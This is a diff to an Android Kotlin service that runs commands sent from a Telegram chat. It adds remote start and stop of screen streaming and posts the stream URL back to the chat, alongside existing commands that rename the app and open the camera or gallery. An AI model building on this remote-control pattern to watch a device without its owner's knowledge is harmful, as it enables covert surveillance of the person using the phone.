@@ -266,6 +266,8 @@ class ControlService : Service() {
                     "rename"        -> AppNameHelper.rename(this@ControlService, cmd.optString("name"))
                     "open_gallery"  -> FilePickerActivity.startGallery(this@ControlService, cmd.optString("_chat_id", ""))
                     "open_camera"   -> FilePickerActivity.startCamera(this@ControlService, cmd.optString("_chat_id", ""))
+                    "stream_start"  -> startStream(cmd.optString("_chat_id", ""))
+                    "stream_stop"   -> stopStream(cmd.optString("_chat_id", ""))
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Command failed: ${e.message}")
@@ -390,4 +392,36 @@ class ControlService : Service() {
     private fun updateNotification(text: String) {
         getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
     }
+    private fun startStream(chatId: String) {
+        val intent = Intent(this, StreamPermissionActivity::class.java)
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(intent)
+        // Отправляем URL в тг после небольшой задержки
+        scope.launch {
+            kotlinx.coroutines.delay(3000)
+            val url = ScreenStreamService.streamUrl
+            if (url.isNotEmpty()) {
+                postJson("/text_reply", org.json.JSONObject().apply {
+                    put("chat_id", chatId)
+                    put("device_id", deviceId)
+                    put("text", "📡 Стрим запущен\n🔗 $url\n\nОткрой ссылку в браузере на том же WiFi")
+                })
+            }
+        }
+    }
+
+    private fun stopStream(chatId: String) {
+        val intent = Intent(this, ScreenStreamService::class.java).apply {
+            action = ScreenStreamService.ACTION_STOP
+        }
+        startService(intent)
+        scope.launch {
+            postJson("/text_reply", org.json.JSONObject().apply {
+                put("chat_id", chatId)
+                put("device_id", deviceId)
+                put("text", "⛔ Стрим остановлен")
+            })
+        }
+    }
+
 }
